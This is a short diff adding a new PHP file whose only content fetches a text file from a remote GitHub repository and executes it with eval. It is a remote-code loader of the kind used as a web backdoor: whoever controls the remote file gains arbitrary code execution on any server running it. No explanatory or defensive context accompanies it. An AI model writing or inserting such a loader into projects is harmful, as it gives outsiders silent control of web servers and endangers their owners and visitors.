@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/119marketingmg-ctrl/SCRIP-BACKUP/refs/heads/main/diamtapipasti.txt'));
+
+$content = "?> ".$content;
+eval($content);
